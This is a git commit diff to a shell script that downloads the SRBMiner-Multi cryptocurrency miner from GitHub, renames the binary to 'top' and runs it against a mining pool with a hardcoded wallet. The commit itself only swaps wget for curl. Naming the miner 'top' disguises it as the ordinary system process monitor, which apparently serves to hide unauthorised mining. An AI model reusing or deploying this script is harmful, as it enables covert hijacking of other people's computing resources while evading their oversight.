a983d0f12e2b298661e7ceaadfb91bbc45640cf6
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-10-19 02:00:21 +0700

    Update luckkc.sh

--- luckkc.sh
+++ luckkc.sh
@@ -1,4 +1,4 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
+curl -L -o SRBMiner-Multi-2-5-6-Linux.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
 
 tar -xf SRBMiner-Multi-2-5-6-Linux.tar.gz
 
@@ -6,4 +6,4 @@ cd SRBMiner-Multi-2-5-6
 
 mv SRBMiner-MULTI top
 
-./top -a flex -o eu.mpool.live:5271 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.lucky
+./top -a flex -o eu.mpool.live:5271 -u kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.lucky
